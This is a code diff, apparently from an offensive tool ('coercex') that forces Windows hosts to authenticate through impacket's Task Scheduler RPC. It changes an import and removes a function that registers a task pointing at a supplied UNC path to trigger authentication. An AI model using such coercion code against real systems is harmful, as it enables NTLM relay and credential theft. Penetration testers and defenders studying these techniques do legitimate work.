@@ -10,7 +10,7 @@ from impacket.dcerpc.v5 import tsch
 from impacket.dcerpc.v5.dtypes import NULL
 
 from coercex.methods.base import CoercionMethod, PipeBinding
-from coercex.utils import random_string
+from coercex.net import random_string
 
 TSCH_UUID = "86d35949-83c9-4044-b424-db363231fd0c"
 
@@ -72,31 +72,6 @@ def _trigger_register_task(dce, path, target):
         NULL,
         tsch.TASK_LOGON_NONE,
     )
-
-
-def _trigger_retrieve_task(dce, path, target):
-    """SchRpcRetrieveTask - retrieve task definition.
-
-    First register a task with UNC path, then retrieve it to trigger
-    additional path validation.
-    """
-    clean_path = path.rstrip("\x00")
-    task_name = f"\\{random_string(12)}"
-    task_xml = TASK_XML_TEMPLATE.format(
-        description=random_string(8),
-        unc_path=clean_path,
-    )
-    try:
-        tsch.hSchRpcRegisterTask(
-            dce,
-            task_name,
-            task_xml,
-            tsch.TASK_CREATE | tsch.TASK_DONT_ADD_PRINCIPAL_ACE,
-            NULL,
-            tsch.TASK_LOGON_NONE,
-        )
-    except Exception:
-        pass  # Registration may fail but the path probe still happens
 
 
 def get_methods() -> list[CoercionMethod]:
